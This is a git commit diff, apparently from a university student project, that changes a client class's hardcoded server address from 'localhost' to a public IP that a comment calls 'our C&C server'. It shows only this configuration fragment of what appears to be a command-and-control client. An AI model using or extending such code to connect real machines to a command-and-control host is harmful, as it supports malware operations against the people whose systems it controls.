b697a89f9d3b264bfac03a5bf689d31b9ebf08bf
gaoxiangshuai <xiangsgao@cs.stonybrook.edu>
2020-05-03 22:07:50 -0400

    bug fixes and restructuring

--- client2.py
+++ client2.py
@@ -14,8 +14,7 @@ class client:
     # socket for connection to the server
     sock_to_server = None
     # ip address of our C&C server, can be changed depending on what ip server is located
-    # host = '18.205.103.236'
-    host = 'localhost'
+    host = '18.205.103.236'
     # port of the server to connect to, can be changed depending on what port server is listening at
     port = 3000
 
